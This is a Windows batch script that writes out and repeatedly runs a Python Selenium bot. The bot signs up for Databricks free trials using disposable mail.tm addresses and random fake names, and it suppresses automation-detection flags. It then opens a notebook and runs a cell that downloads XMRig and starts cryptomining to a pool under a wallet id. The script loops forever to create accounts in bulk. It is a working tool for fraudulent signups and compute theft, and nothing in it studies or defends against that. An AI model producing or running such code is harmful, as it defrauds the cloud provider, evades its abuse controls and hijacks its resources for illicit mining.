pip install selenium names		
echo	import sys, time, names	> databricks.py
echo	sys.path.insert(0,'/usr/lib/chromium-browser/chromedriver') >> databricks.py
echo	from selenium import webdriver >> databricks.py
echo	from selenium.webdriver import ActionChains >> databricks.py
echo	from selenium.webdriver.common.keys import Keys >> databricks.py
echo	from selenium.webdriver.support.ui import WebDriverWait >> databricks.py
echo	from selenium.webdriver.common.by import By >> databricks.py
echo	from selenium.webdriver.support import expected_conditions as EC >> databricks.py
echo	options = webdriver.ChromeOptions() >> databricks.py
echo	options.add_experimental_option("excludeSwitches", ["enable-automation"]) >> databricks.py
echo	options.add_experimental_option('useAutomationExtension', False) >> databricks.py
echo	options.add_argument('--disable-blink-features=AutomationControlled') >> databricks.py
echo	#options.add_argument('--headless') >> databricks.py
echo	options.add_argument('--no-sandbox') >> databricks.py
echo	options.add_argument('--disable-dev-shm-usage') >> databricks.py
echo	options.add_argument('--disable-software-rasterizer')	>> databricks.py
echo	options.add_argument('--disable-gpu') >> databricks.py
echo	options.add_argument('--window-size=1920x1480') >> databricks.py
echo	driver = webdriver.Chrome('chromedriver',options=options) >> databricks.py
echo	def get_email(): >> databricks.py
echo	    print("get email") >> databricks.py
echo	    global email >> databricks.py
echo	    driver.get("https://mail.tm/en/") >> databricks.py
echo	    WebDriverWait(driver,120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[contains(text(),"40 MB")]'))) >> databricks.py
echo	    driver.execute_script("document.querySelector('#accounts-menu > span > span').click();") >> databricks.py
echo	    time.sleep(2) >> databricks.py
echo	    email = driver.find_element_by_xpath('//*[@id="accounts-list"]/div/div[1]/p[2]').text	>> databricks.py
echo	    print(email) >> databricks.py
echo	def try_databricks(): >> databricks.py
echo	    print("Open databricks") >> databricks.py
echo	    driver.execute_script("window.open('about:blank','secondtab');") >> databricks.py
echo	    driver.switch_to.window("secondtab") >> databricks.py
echo	    driver.get('https://databricks.com/try-databricks') >> databricks.py
echo	    driver.execute_script("document.querySelector('#FirstName').value='"+names.get_first_name()+"';") >> databricks.py
echo	    driver.execute_script("document.querySelector('#LastName').value='"+names.get_last_name()+"';") >> databricks.py
echo	    driver.execute_script("document.querySelector('#Company').value='"+names.get_last_name()+"';") >> databricks.py
echo	    driver.execute_script("document.querySelector('#Email').value='"+email+"';") >> databricks.py
echo	    driver.execute_script("document.querySelector('#Title').value='staff';") >> databricks.py
echo	    driver.execute_script("document.querySelector('#mkto_form_consent').click();") >> databricks.py
echo	    time.sleep(10)	>> databricks.py
echo	    try: >> databricks.py
echo	      driver.execute_script("document.querySelector('#submitToMktoForm_2021Feb10 > div.mktoButtonRow > span > button').click();")	>> databricks.py
echo	      time.sleep(10) >> databricks.py
echo	      driver.execute_script("document.querySelector('#ce-placeholder-button').click();") >> databricks.py
echo	      WebDriverWait(driver, 120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[contains(text(),"Time to check your email!")]'))) >> databricks.py
echo	    except: >> databricks.py
echo	      driver.quit() >> databricks.py
echo	def read_email():	>> databricks.py
echo	    print("read email")	>> databricks.py
echo	    driver.get("https://mail.tm/en/")	>> databricks.py
echo	    WebDriverWait(driver,120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul'))) >> databricks.py
echo	    #read email	>> databricks.py
echo	    driver.find_element_by_xpath('//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul').click() >> databricks.py
echo	    WebDriverWait(driver,120).until(EC.frame_to_be_available_and_switch_to_it((By.ID,"iFrameResizer0"))) >> databricks.py
echo	    #confirm link	>> databricks.py
echo	    driver.execute_script("document.querySelector('body > p:nth-child(3) > a').click();")	>> databricks.py
echo	def reset_password():	>> databricks.py
echo	    print("reset password") >> databricks.py
echo	    driver.switch_to.default_content() >> databricks.py
echo	    handles = driver.window_handles >> databricks.py
echo	    size = len(handles) >> databricks.py
echo	    for x in range(size): >> databricks.py
echo	        if handles[x] != driver.current_window_handle: >> databricks.py
echo	            driver.switch_to.window(handles[x])	>> databricks.py
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="reset-container"]/div/div[1]/input'))) >> databricks.py
echo	    driver.execute_script("document.querySelector('#reset-container > div > div:nth-child(3) > input').value='1234Asdfg@';") >> databricks.py
echo	    driver.execute_script("document.querySelector('#reset-container > div > div:nth-child(5) > input').value='1234Asdfg@';") >> databricks.py
echo	    #click reset >> databricks.py
echo	    time.sleep(3) >> databricks.py
echo	    driver.execute_script("document.querySelector('#reset-container > div > div:nth-child(6) > button').click();") >> databricks.py
echo	def create_workspace():	>> databricks.py
echo	    print("create workspace")	>> databricks.py
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]')))	>> databricks.py
echo	    #new python notebook	>> databricks.py
echo	    driver.execute_script("document.querySelector('#content > div > div > uses-legacy-bootstrap > div > div > div.homeview-inner > div.homeview-panel > div.ant-row.ant-row-center.homeview-row.homeview-top > div:nth-child(3) > div > div > div > a > div.header').click();") >> databricks.py
echo	    #input name	>> databricks.py
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="input"]'))) >> databricks.py
echo	    driver.find_element_by_xpath('//*[@id="input"]').send_keys("Plant")	>> databricks.py
echo	    #create	>> databricks.py
echo	    driver.execute_script("document.querySelector('body > div.ReactModalPortal > div > div > uses-legacy-bootstrap > uses-legacy-bootstrap > button.btn.btn-primary > span').click();")	>> databricks.py
echo	    #click cell	>> databricks.py
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[2]/div[2]/div/div[3]/div[1]/div/div/div/div[4]/div[1]/div/div/div/div[5]/div/pre'))) >> databricks.py
echo	    #input command >> databricks.py
echo	    driver.find_element_by_css_selector(".CodeMirror-line").click()	>> databricks.py
echo	    driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("!wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.allcoins.pw:3333 -a rx -k -u allcoins.pw -p 511240")	>> databricks.py
echo	    #start cell >> databricks.py
echo	    driver.find_element_by_css_selector(".fa-play").click() >> databricks.py
echo	    driver.find_element_by_css_selector(".run-cell > .fa").click() >> databricks.py
echo	    driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click() >> databricks.py
echo	    driver.save_screenshot('workspace.png') >> databricks.py
echo	    print("**********************DONE***************************") >> databricks.py
echo	get_email() >> databricks.py
echo	try_databricks() >> databricks.py
echo	read_email() >> databricks.py
echo	reset_password() >> databricks.py
echo	create_workspace() >> databricks.py
:loop
python databricks.py
goto :loop	
